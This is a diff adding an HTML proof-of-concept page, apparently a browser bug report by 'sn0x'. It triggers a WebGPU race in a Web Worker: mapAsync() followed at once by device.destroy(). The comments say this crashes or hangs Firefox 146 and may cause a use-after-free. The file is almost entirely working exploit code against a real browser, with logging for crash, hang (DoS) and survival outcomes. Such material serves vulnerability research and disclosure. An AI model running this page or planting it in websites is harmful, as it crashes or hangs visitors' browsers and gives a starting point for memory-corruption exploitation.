@@ -1,0 +1,61 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>WebGPU Worker Destroy-Race Crash — sn0x</title>
+<style>body{font:13px monospace;background:#0d0d0d;color:#ccc;margin:20px}</style>
+<h1>WebGPU Worker mapAsync/destroy Race Crash</h1>
+<p>Crashes the page via <code>mapAsync()</code> + immediate <code>device.destroy()</code> in a Web Worker.</p>
+<div id="log"></div>
+<script>
+const L = document.getElementById('log');
+function w(m) { L.textContent += m + '\n'; console.log(m); }
+
+w('UA: ' + navigator.userAgent);
+w('');
+
+if (!navigator.gpu) {
+  w('ERROR: navigator.gpu undefined — enable dom.webgpu.enabled in about:config');
+} else {
+  w('[*] Spawning Worker with mapAsync + device.destroy() race...');
+  w('[*] Expected: page crash within ~1s in Firefox 146');
+  w('');
+
+  const code = `
+    self.onmessage = async () => {
+      const adapter = await navigator.gpu.requestAdapter();
+      const device = await adapter.requestDevice();
+      const buf = device.createBuffer({
+        size: 4096,
+        usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST,
+      });
+      // Race: start mapAsync IPC → immediately destroy device
+      const mapProm = buf.mapAsync(GPUMapMode.READ);
+      device.destroy();  // GPU process gets destroy while map IPC is in-flight
+      await mapProm;     // Awaiting the result of a race with a freed buffer → UAF/crash
+      self.postMessage('survived');
+    };
+  `;
+
+  const blob = new Blob([code], { type: 'application/javascript' });
+  const w2 = new Worker(URL.createObjectURL(blob));
+
+  const timer = setTimeout(() => {
+    w2.terminate();
+    w('[+] Worker timed out (>5s) — hang variant (DoS)');
+  }, 5000);
+
+  w2.onmessage = e => {
+    clearTimeout(timer);
+    w2.terminate();
+    w('[+] Worker survived: ' + e.data + ' — no crash (may be patched)');
+  };
+
+  w2.onerror = e => {
+    clearTimeout(timer);
+    w2.terminate();
+    w('[!] Worker error: ' + e.message + ' — not a crash, error was handled');
+  };
+
+  w2.postMessage('go');
+  w('[*] Worker posted — waiting...');
+}
+</script>
